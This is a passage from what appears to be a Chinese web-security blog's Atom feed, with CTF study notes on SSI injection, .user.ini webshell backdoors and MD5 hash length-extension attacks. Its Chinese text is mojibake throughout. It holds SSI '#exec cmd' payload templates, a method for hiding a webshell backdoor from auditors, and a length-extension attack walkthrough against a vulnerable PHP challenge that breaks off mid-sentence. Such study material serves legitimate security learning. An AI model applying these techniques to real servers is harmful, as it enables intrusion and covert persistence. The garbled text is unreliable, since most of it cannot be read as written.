title="SSIä¸­æ—¥æœŸæ ¼å¼çš„å®šä¹‰"></a>SSIä¸­æ—¥æœŸæ ¼å¼çš„å®šä¹‰</h2><p><code>%a</code> ä¸€å‘¨ä¸ƒå¤©çš„ç¼©å†™å½¢å¼ Thu<br><code>%A</code> ä¸€å‘¨ä¸ƒå¤© Thursday<br><code>%b</code> æœˆçš„ç¼©å†™å½¢å¼ Apr<br><code>%B</code> æœˆ April<br><code>%d</code> ä¸€ä¸ªæœˆå†…çš„ç¬¬å‡ å¤© 13<br><code>%D</code> mm/dd/yyæ—¥æœŸæ ¼å¼ 04/13/00<br><code>%H</code> å°æ—¶ï¼ˆ24å°æ—¶åˆ¶ï¼Œä»00åˆ°23ï¼‰ 01<br><code>%I</code> å°æ—¶ï¼ˆ12å°æ—¶åˆ¶ï¼Œä»00åˆ°11ï¼‰ 01<br><code>%j</code> ä¸€å¹´å†…çš„ç¬¬å‡ å¤©ï¼Œä»01åˆ°365 104<br><code>%m</code> ä¸€å¹´å†…çš„ç¬¬å‡ ä¸ªæœˆï¼Œä»01åˆ°12 04<br><code>%M</code> ä¸€å°æ—¶å†…çš„ç¬¬å‡ åˆ†é’Ÿï¼Œä»00åˆ°59 10<br><code>%p</code> AMæˆ–PM AM<br><code>%r</code> 12å°æ—¶åˆ¶çš„å½“åœ°æ—¶é—´ï¼Œæ ¼å¼ä¸º 01:10:18 AM<br><code>%S</code> ä¸€åˆ†é’Ÿå†…çš„ç¬¬å‡ ç§’ï¼Œä»00åˆ°59 18<br><code>%T</code> 24å°æ—¶åˆ¶çš„%H:%M:%Sæ—¶é—´æ ¼å¼ 01:10:18<br><code>%U</code> ä¸€å¹´å†…çš„ç¬¬å‡ ä¸ªæ˜ŸæœŸï¼Œä»00åˆ°52ï¼Œä»¥æ˜ŸæœŸå¤©ä½œä¸ºæ¯ä¸ªæ˜ŸæœŸçš„ç¬¬ä¸€å¤©<br><code>%w</code> ä¸€æ˜ŸæœŸå†…çš„ç¬¬ä¸€å¤©ï¼Œä»0åˆ°6 4<br><code>%W</code> ä¸€å¹´å†…çš„ç¬¬å‡ ä¸ªæ˜ŸæœŸï¼Œä»00åˆ° 53ï¼Œä»¥æ˜ŸæœŸä¸€ä½œä¸ºæ¯ä¸ªæ˜ŸæœŸçš„ç¬¬ä¸€å¤©<br><code>%y</code> å¹´çš„ç¼©å†™å½¢å¼ï¼Œä»00åˆ°99 00<br><code>%Y</code> ç”¨å››ä½æ•°å­—è¡¨ç¤ºä¸€å¹´ 2000<br><code>%Z</code> æ—¶åŒºåç§°</p><h1 id="SSIæ¼æ´äº§ç”Ÿçš„æ¡ä»¶"><a href="#SSIæ¼æ´äº§ç”Ÿçš„æ¡ä»¶" class="headerlink" title="SSIæ¼æ´äº§ç”Ÿçš„æ¡ä»¶"></a>SSIæ¼æ´äº§ç”Ÿçš„æ¡ä»¶</h1><p>ç”¨æˆ·å­˜åœ¨å¯æ§è¾“å…¥ï¼Œå¹¶ä¸”æœªè¿‡æ»¤ï¼Œå¹¶ä¸”è¿˜èƒ½å›æ˜¾åµŒå…¥åˆ°htmlä¸­ï¼Œå¦‚å…¶ä¸­ä¸€æ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;&quot;...&quot;&quot;--&gt;ï¼ˆä¼šæ‰§è¡Œç»™å®šçš„ shell å‘½ä»¤ï¼‰</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰è¿‡æ»¤å§<code>&lt;!#â€“</code>ç­‰æ•æ„Ÿå­—ç¬¦ï¼Œå°±ä¼šé€ æˆç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼Œ<br>é€šå¸¸å­˜åœ¨XSSçš„åœ°æ–¹å¦‚æœå¼€å¯äº†SSIæœåŠ¡ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆæœåŠ¡å™¨æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;&quot;...&quot;&quot;--&gt;ï¼ˆä¼šæ˜¾ç¤ºç»™å®šçš„æ–‡ä»¶ï¼‰</span><br></pre></td></tr></table></figure><p>ä½†æ„Ÿè§‰è¿™ä¸ªæ¼æ´åœ¨ç›®å‰çš„çŠ¶å†µæ¥è¯´å°±æ˜¯ç»è¿¹äº†ï¼Œå› ä¸ºapacheå’Œnginxéƒ½é»˜è®¤å…³é—­äº†ssiï¼Œå°±ç®—å¼€å¯äº†ssiï¼Œä¹Ÿä¸ä¸€å®šæœ‰å¼€å¯å›æ˜¾çš„ï¼Œé™¤éæœ‰å“ªä¸ªç¨‹åºå‘˜çœŸçš„è‡ªå·±ä½œæ­»ï¼ŒğŸ˜‚</p><h1 id="SSIé˜²æŠ¤"><a href="#SSIé˜²æŠ¤" class="headerlink" title="SSIé˜²æŠ¤"></a>SSIé˜²æŠ¤</h1><ul><li>å…³é—­æœåŠ¡å™¨SSIåŠŸèƒ½</li><li>è¿‡æ»¤ç›¸å…³SSIç‰¹æ®Šå­—ç¬¦ï¼ˆ<code>&lt;,&gt;,#,-,&quot;,&#39;</code>ï¼‰</li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><p><a href="[https://www.sherlocklee.top/2018/10/28/%E6%B3%A8%E5%85%A5/ssi%E6%BC%8F%E6%B4%9E/](https://www.sherlocklee.top/2018/10/28/æ³¨å…¥/ssiæ¼æ´/">ssiæ¼æ´</a>)</p></li><li><p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">æœåŠ¡å™¨ç«¯åŒ…å«æ³¨å…¥SSIåˆ†ææ€»ç»“</a></p></li><li><p><a href="[https://shuaizhupeiqi.github.io/2018/11/17/SSI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B3%A8%E5%85%A5/](https://shuaizhupeiqi.github.io/2018/11/17/SSIæœåŠ¡å™¨æ³¨å…¥/">SSIæœåŠ¡å™¨æ³¨å…¥</a>)</p></li><li><p><a href="https://www.cnblogs.com/wqhwe/p/5442612.html" target="_blank" rel="noopener">SSIæŒ‡ä»¤</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‰“çœèµ›çš„æ—¶å€™é‡åˆ°äº†ï¼Œè¿™é‡Œè®°å½•å­¦ä¹ ä¸€ä¸‹å§¿åŠ¿&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨</title>
    <link href="http://0clickjacking0.github.io/2019/08/29/user-ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8/"/>
    <id>http://0clickjacking0.github.io/2019/08/29/user-iniæ–‡ä»¶æ„æˆçš„PHPåé—¨/</id>
    <published>2019-08-29T06:09:08.000Z</published>
    <updated>2019-08-29T06:59:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨suctf2019ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œè¿™é‡Œå­¦ä¹ è®°å½•ä¸€ä¸‹</p><a id="more"></a><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨suctf2019ä¸€é“ä¸Šä¼ çš„é¢˜ç›®ä¸­ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œä¹Ÿå­¦ä¹ æŒæ¡äº†æ–°å§¿åŠ¿ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹</p><h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><p>æˆ‘ä»¬å…ˆçœ‹ä¸‹phpå®˜æ–¹æ‰‹å†Œå¯¹<code>.user.ini</code>å¯¹è¯´æ˜</p><p><img src="http://images.xianyu123.club/user.ini.png" alt></p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨<code>.user.ini</code>ä¸­è®¾ç½®<code>php.ini</code>ä¸­<strong>PHP_INI_PERDIR</strong> å’Œ <strong>PHP_INI_USER</strong> æ¨¡å¼çš„ INI è®¾ç½®ï¼Œè€Œä¸”åªè¦æ˜¯åœ¨ä½¿ç”¨ <strong>CGIï¼FastCGI</strong> æ¨¡å¼çš„æœåŠ¡å™¨ä¸Šéƒ½å¯ä»¥ä½¿ç”¨<code>.user.ini</code></p><p>è¿™é‡Œæˆ‘ä»¬å‘ç°äº†ä¸¤ä¸ªæœ‰è¶£çš„è®¾ç½®ï¼š<strong>auto_prepend_file</strong>å’Œ<strong>auto_append_file</strong></p><p><img src="http://images.xianyu123.club/user.ini2.png" alt></p><p>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=1.gif</span><br></pre></td></tr></table></figure><p>1.gifæ˜¯è¦åŒ…å«çš„æ–‡ä»¶ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©.user.iniè½»æ¾è®©æ‰€æœ‰phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯ä¸€ä¸ªæ­£å¸¸phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«ä¸€å¥è¯çš„webshellã€‚</p><p>è¿™ä¸¤ä¸ªè®¾ç½®çš„åŒºåˆ«åªæ˜¯åœ¨äº<strong>auto_prepend_file</strong>æ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼›<strong>auto_append_file</strong>åœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰<code>exit()</code>æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰</p><h1 id="åœ¨å®æˆ˜ä¸­çš„åˆ©ç”¨"><a href="#åœ¨å®æˆ˜ä¸­çš„åˆ©ç”¨" class="headerlink" title="åœ¨å®æˆ˜ä¸­çš„åˆ©ç”¨"></a>åœ¨å®æˆ˜ä¸­çš„åˆ©ç”¨</h1><p>ç»¼ä¸Šæ‰€è¿°<code>.user.ini</code>çš„åˆ©ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š</p><ol><li>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP</li><li>æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼</li><li>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</li></ol><p>ä»è¿™æ¥çœ‹<code>.user.ini</code>è¦æ¯”<code>.htaccess</code>çš„åº”ç”¨èŒƒå›´è¦å¹¿ä¸€äº›ï¼Œæ¯•ç«Ÿ<code>.htaccess</code>åªèƒ½ç”¨äºApache</p><p>ä½†ä»”ç»†æ¨æ•²æˆ‘ä»¬å°±ä¼šæ„Ÿåˆ°<strong>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</strong>è¿™ä¸ªè¦æ±‚åœ¨æ–‡ä»¶ä¸Šä¼ ä¸­ä¹Ÿæ¯”è¾ƒè‹›åˆ»ï¼Œåº”è¯¥æ²¡æœ‰å¼€å‘è€…ä¼šæŠŠä¸Šä¼ æ–‡ä»¶æ”¾åœ¨ä¸»ç›®å½•æˆ–è€…æŠŠphpæ–‡ä»¶æ”¾åœ¨ä¸Šä¼ æ–‡ä»¶å¤¹ã€‚å¦‚æœéƒ½èƒ½æˆåŠŸä¸Šä¼ phpæ–‡ä»¶å¹¶ä¸”æ‰§è¡Œï¼Œé‚£ä¸ºä½•è¿˜è¦ä¸Šä¼ <code>.user.ini</code>å‘¢</p><p>ä¸è¿‡æŠŠ<code>.user.ini</code>åˆ©ç”¨åœ¨éšè—åé—¨ä¸Šåº”è¯¥æ˜¯ä¸ªå¾ˆå¥½çš„åˆ©ç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨å­˜åœ¨phpæ–‡ä»¶çš„ç›®å½•ä¸‹ç•™ä¸‹<code>.user.ini</code>å’Œæˆ‘ä»¬çš„å›¾ç‰‡é©¬æˆ–è€…ä¸€äº›çœ‹ä¼¼æ­£å¸¸phpæ–‡ä»¶ï¼ˆå…¶å®æ˜¯åé—¨ï¼Œæ¥é¿å¼€æœ¬åœ°çš„ä¸€äº›é˜²æŠ¤è½¯ä»¶æˆ–è€…å®‰å…¨äººå‘˜çš„å®¡è®¡ï¼‰ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†éšè—åé—¨çš„ç›®çš„ã€‚</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://xz.aliyun.com/t/6091" target="_blank" rel="noopener">ä»SUCTF 2019 CheckIn æµ…è°ˆ.user.iniçš„åˆ©ç”¨</a></li><li><a href="[https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨.html">pç‰›çš„user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨</a>)</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨suctf2019ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œè¿™é‡Œå­¦ä¹ è®°å½•ä¸€ä¸‹&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>hashæ‰©å±•æ”»å‡»</title>
    <link href="http://0clickjacking0.github.io/2019/07/09/hash%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://0clickjacking0.github.io/2019/07/09/hashæ‰©å±•æ”»å‡»/</id>
    <published>2019-07-09T07:50:59.000Z</published>
    <updated>2019-08-09T06:23:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡å›½èµ›é‡åˆ°äº†è¿™ä¸ªæ¼æ´ï¼Œä»¥å‰çœ‹è¿‡è¿™ä¸ªæ¼æ´ï¼Œä½†æ²¡æœ‰åƒé€å¯¼è‡´è¿™æ¬¡å›½èµ›æ²¡åšå‡ºæ¥ï¼Œè¿™æ¬¡å‡†å¤‡å¥½å¥½ç ”ç©¶ä¸€ä¸‹ï¼Œå†™ä¸‹è¿™ç¯‡å­¦ä¹ ç¬”è®°</p><a id="more"></a><h1 id="hashåŸç†"><a href="#hashåŸç†" class="headerlink" title="hashåŸç†"></a>hashåŸç†</h1><p>é¦–å…ˆè¦è®²hashç®—æ³•(ä¾‹å¦‚md5)ï¼Œä½†æ˜¯ä¹Ÿä¸éœ€è¦å¤ªäº†è§£ï¼Œåªéœ€è¦çŸ¥é“ä»¥ä¸‹å‡ ç‚¹å°±å¯ä»¥äº†</p><ol><li><p>MD5åŠ å¯†è¿‡ç¨‹ä¸­512æ¯”ç‰¹ï¼ˆ64å­—èŠ‚ï¼‰ä¸ºä¸€ç»„ï¼Œå±äºåˆ†ç»„åŠ å¯†ï¼Œè€Œä¸”åœ¨è¿ç®—çš„è¿‡ç¨‹ä¸­ï¼Œå°†512æ¯”ç‰¹åˆ†ä¸º32bit*16å—ï¼Œåˆ†å—è¿ç®— </p></li><li><p>æˆ‘ä»¬å…³é”®åˆ©ç”¨çš„æ˜¯MD5çš„å¡«å……ï¼Œå¯¹åŠ å¯†çš„å­—ç¬¦ä¸²è¿›è¡Œå¡«å……(æ¯”ç‰¹ç¬¬ä¸€ä½ä¸º1å…¶ä½™æ¯”ç‰¹ä¸º0)ï¼Œä½¿ä¹‹(äºŒè¿›åˆ¶)è¡¥åˆ°448æ¨¡512åŒä½™ï¼Œå³é•¿åº¦ä¸º512çš„å€æ•°å‡64ï¼Œæœ€åçš„64ä½åœ¨è¡¥å……ä¸ºåŸæ¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¿™æ ·åˆšå¥½è¡¥æ»¡512ä½çš„å€æ•°ï¼Œå¦‚æœå½“å‰æ˜æ–‡æ­£å¥½æ˜¯512bitå€æ•°åˆ™å†åŠ ä¸Šä¸€ä¸ª512bitçš„ä¸€ç»„ã€‚ </p></li><li><p>MD5ä¸ç®¡æ€ä¹ˆåŠ å¯†ï¼Œæ¯ä¸€å—åŠ å¯†å¾—åˆ°çš„å¯†æ–‡ä½œä¸ºä¸‹ä¸€æ¬¡åŠ å¯†çš„åˆå§‹å‘é‡IVï¼Œè¿™ä¸€ç‚¹å¾ˆå…³é”®ï¼ï¼ï¼</p></li></ol><p>ä¸‹é¢å·²md5ç®—æ³•ä¸ºä»£è¡¨ç®€å•è®²è§£åŠ å¯†è¿‡ç¨‹</p><h1 id="MD5åŠ å¯†è¿‡ç¨‹"><a href="#MD5åŠ å¯†è¿‡ç¨‹" class="headerlink" title="MD5åŠ å¯†è¿‡ç¨‹"></a>MD5åŠ å¯†è¿‡ç¨‹</h1><p>æ¯”å¦‚è®¡ç®—å­—ç¬¦ä¸²<code>xianyu123</code>ï¼Œé¦–å…ˆè¦æŠŠå®ƒå˜æˆåå…­è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ä¸º<code>0x7869616e7975313233</code><br><img src="http://images.xianyu123.club/hash_attack1.png" alt></p><h2 id="è¡¥ä½"><a href="#è¡¥ä½" class="headerlink" title="è¡¥ä½"></a>è¡¥ä½</h2><p>ï¼ˆ1byte=8bitï¼‰æ¶ˆæ¯å¿…é¡»è¿›è¡Œè¡¥ä½ï¼Œå³ä½¿å¾—å…¶é•¿åº¦åœ¨å¯¹ 512 å–æ¨¡åçš„å€¼ä¸º 448ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>len(message) % 512 == 448</code>ã€‚å½“æ¶ˆæ¯é•¿åº¦ä¸æ»¡ 448 bit æ—¶<strong>ï¼ˆæ³¨æ„æ˜¯ä½ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²é•¿åº¦ï¼‰</strong>ï¼Œæ¶ˆæ¯é•¿åº¦è¾¾åˆ° 448 bit å³å¯ã€‚å½“ç„¶ï¼Œå¦‚æœæ¶ˆæ¯é•¿åº¦å·²ç»è¾¾åˆ° 448 bitï¼Œä¹Ÿè¦è¿›è¡Œè¡¥ä½ã€‚è¡¥ä½æ˜¯å¿…é¡»çš„ã€‚<br>è¡¥ä½çš„æ–¹å¼çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ˜¯åœ¨æ¶ˆæ¯çš„åé¢åŠ ä¸Šä¸€ä¸ª1ï¼Œåé¢è·Ÿç€æ— é™ä¸ª0ï¼Œç›´åˆ° <code>len(message) % 512 == 448</code>ã€‚åœ¨ 16 è¿›åˆ¶ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ¶ˆæ¯åè¡¥<code>80</code>ï¼Œä¹Ÿå°±æ˜¯ 2 è¿›åˆ¶çš„<code>10000000</code>ã€‚æˆ‘ä»¬æŠŠæ¶ˆæ¯<code>xianyu123</code>è¿›è¡Œè¡¥ä½åˆ°é•¿åº¦ä¸º56ä½çš„æ•´æ•°å€æ•°</p><p><img src="http://images.xianyu123.club/hash_attack2.png" alt></p><h2 id="è¡¥é•¿åº¦"><a href="#è¡¥é•¿åº¦" class="headerlink" title="è¡¥é•¿åº¦"></a>è¡¥é•¿åº¦</h2><p>è¡¥ä½è¿‡åï¼Œç¬¬ 57 ä¸ªå­—èŠ‚å‚¨å­˜çš„æ˜¯è¡¥ä½ä¹‹å‰çš„æ¶ˆæ¯é•¿åº¦ã€‚<code>xianyu123</code>æ˜¯ 9ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯ 9 ä¸ªå­—èŠ‚ï¼Œ72 bitã€‚æ¢ç®—æˆ 16 è¿›åˆ¶ä¸º<code>0x48</code>ã€‚å…¶åè·Ÿç€ 7 ä¸ªå­—èŠ‚çš„ 0x00ï¼ŒæŠŠæ¶ˆæ¯è¡¥æ»¡ 64 å­—èŠ‚ã€‚</p><p>é•¿åº¦æ˜¯<a href="https://blog.csdn.net/github_35681219/article/details/52743048" target="_blank" rel="noopener">å°ç«¯å­˜å‚¨</a>çš„ï¼Œä¹Ÿå°±æ˜¯è¯´é«˜å­—èŠ‚æ”¾åœ¨é«˜åœ°å€ä¸­ã€‚</p><p><strong>MD5ä¸­å­˜å‚¨çš„éƒ½æ˜¯å°ç«¯æ–¹å¼ï¼</strong><br><strong>MD5ä¸­å­˜å‚¨çš„éƒ½æ˜¯å°ç«¯æ–¹å¼ï¼</strong><br><strong>MD5ä¸­å­˜å‚¨çš„éƒ½æ˜¯å°ç«¯æ–¹å¼ï¼</strong><br>é‡è¦çš„äº‹æƒ…è¯´ä¸‰éï¼Œä¸¾ä¸ªä¾‹å­ï¼šå‡å¦‚æˆ‘ä»¬è¿™ä¸€å—å€¼ä¸º<code>0x12345678</code><br>é‚£ä¹ˆåœ¨MD5è¿ç®—æ—¶å€™å­˜å‚¨çš„é¡ºåºæ˜¯<code>0x78563412</code><br>è¿™ä¹Ÿæ˜¯ä¹‹æ‰€ä»¥å8å­—èŠ‚ä¸ºé•¿åº¦ï¼Œè€Œç¬¬1å­—èŠ‚å…ˆæœ‰æ•°æ®çš„åŸå› </p><p><img src="http://images.xianyu123.club/hash_attack3.png" alt></p><h2 id="è®¡ç®—æ¶ˆæ¯æ‘˜è¦"><a href="#è®¡ç®—æ¶ˆæ¯æ‘˜è¦" class="headerlink" title="è®¡ç®—æ¶ˆæ¯æ‘˜è¦"></a>è®¡ç®—æ¶ˆæ¯æ‘˜è¦</h2><p>è®¡ç®—æ¶ˆæ¯æ‘˜è¦å¿…é¡»ç”¨è¡¥ä½å·²ç»è¡¥é•¿åº¦å®Œæˆä¹‹åçš„æ¶ˆæ¯æ¥è¿›è¡Œè¿ç®—ï¼Œæ‹¿å‡º 512 bitçš„æ¶ˆæ¯ï¼ˆå³64å­—èŠ‚ï¼‰ã€‚ è®¡ç®—æ¶ˆæ¯æ‘˜è¦çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªåˆå§‹çš„é“¾å˜é‡ï¼Œç”¨æ¥å‚ä¸ç¬¬ä¸€è½®çš„è¿ç®—ã€‚MD5 çš„åˆå§‹é“¾å˜é‡ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸éœ€è¦å…³å¿ƒè®¡ç®—ç»†èŠ‚ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ç»è¿‡ä¸€æ¬¡æ¶ˆæ¯æ‘˜è¦åï¼Œä¸Šé¢çš„é“¾å˜é‡å°†ä¼š<strong>è¢«æ–°çš„å€¼è¦†ç›–</strong>ï¼Œè€Œæœ€åä¸€è½®äº§ç”Ÿçš„é“¾å˜é‡ç»è¿‡é«˜ä½ä½äº’æ¢ï¼ˆå¦‚ï¼šaabbccdd -&gt; ddccbbaaï¼‰åå°±æ˜¯æˆ‘ä»¬è®¡ç®—å‡ºæ¥çš„ md5 å€¼ã€‚</p><h1 id="hashé•¿åº¦æ‰©å±•æ”»å‡»çš„å®ç°"><a href="#hashé•¿åº¦æ‰©å±•æ”»å‡»çš„å®ç°" class="headerlink" title="hashé•¿åº¦æ‰©å±•æ”»å‡»çš„å®ç°"></a>hashé•¿åº¦æ‰©å±•æ”»å‡»çš„å®ç°</h1><h2 id="2019å¹´å›½èµ›åä¸œå—èµ›åŒºåˆ†åŒºèµ›"><a href="#2019å¹´å›½èµ›åä¸œå—èµ›åŒºåˆ†åŒºèµ›" class="headerlink" title="2019å¹´å›½èµ›åä¸œå—èµ›åŒºåˆ†åŒºèµ›"></a>2019å¹´å›½èµ›åä¸œå—èµ›åŒºåˆ†åŒºèµ›</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$user=$_POST[<span class="string">'user'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $key;</span><br><span class="line">    <span class="keyword">return</span> md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (encrypt($user)===$_COOKIE[<span class="string">'verify'</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(strpos($user,<span class="string">'root'</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'not rootï¼ï¼ï¼'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">"verify"</span>,encrypt(<span class="string">"guest"</span>),time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>);</span><br><span class="line">    setcookie(<span class="string">"len"</span>,strlen($key),time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜å’ŒISCC2018çš„é‚£é¢˜ä¸€æ¨¡ä¸€æ ·</p><p>æˆ‘ä»¬è™½ç„¶ä¸çŸ¥é“<code>$key</code>çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“<code>$key</code>çš„é•¿åº¦ï¼Œä¹ŸçŸ¥é“<code>md5($key.&#39;guest&#39;)</code>çš„å€¼ã€‚è€Œæˆ‘ä»¬å¾—åˆ°çš„ hash å€¼æ­£æ˜¯æœ€åä¸€è½®æ‘˜è¦åçš„ç»è¿‡é«˜ä½ä½äº’æ¢çš„é“¾å˜é‡ã€‚<strong>åœ¨å¸¸è§„çš„æ‘˜è¦ä¹‹åæŠŠæˆ‘ä»¬æ§åˆ¶çš„ä¿¡æ¯è¿›è¡Œä¸‹ä¸€è½®æ‘˜è¦ï¼Œåªéœ€è¦çŸ¥é“ä¸Šä¸€è½®æ¶ˆæ¯äº§ç”Ÿçš„é“¾å˜é‡</strong></p><p><img src="http://images.xianyu123.club/hash_attack4.png" alt></p><p>COOKIEä¸­ï¼Œ<code>md5($key&#39;) = 8b3dd2057d3216ca78bf31ede947c0e3</code>ï¼Œä»¥åŠ<code>$key</code>çš„é•¿åº¦ä¸º32ã€‚æˆ‘ä»¬æ¥è¿›è¡Œå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ã€‚</p><h2 id="é•¿åº¦æ‰©å±•"><a href="#é•¿åº¦æ‰©å±•" class="headerlink" title="é•¿åº¦æ‰©å±•"></a>é•¿åº¦æ‰©å±•</h2><p>é¦–å…ˆ$keyæ˜¯32ä¸ªæœªçŸ¥ä½ï¼Œè¿™é‡Œå°±ç”¨é—®å·ä»£æ›¿ï¼Œç„¶åè·Ÿä¸Š<code>guest</code>ï¼Œæ¥ç€æˆ‘ä»¬æŠŠæ¶ˆæ¯è¡¥åˆ°448bitï¼Œä¹Ÿå°±æ˜¯56byteã€‚ç„¶åè¡¥é•¿åº¦ï¼Œ37byte=296bitï¼Œä¹Ÿå°±æ˜¯åå…­è¿›åˆ¶çš„128ï¼Œç„¶åç”¨å°æ®µæ–¹å¼å­˜å‚¨</p><p><img src="http://images.xianyu123.club/hash_attack5.png" alt></p><p>ç„¶åè·Ÿä¸Šè¦é™„åŠ çš„å€¼<code>root</code></p><p><img src="http://images.xianyu123.club/hash_attack6.png" alt></p><p>ç„¶åå»æ‰å‰é¢çš„å‡çš„ <code>$key</code>ï¼Œå¾—åˆ°æœ€ç»ˆçš„ 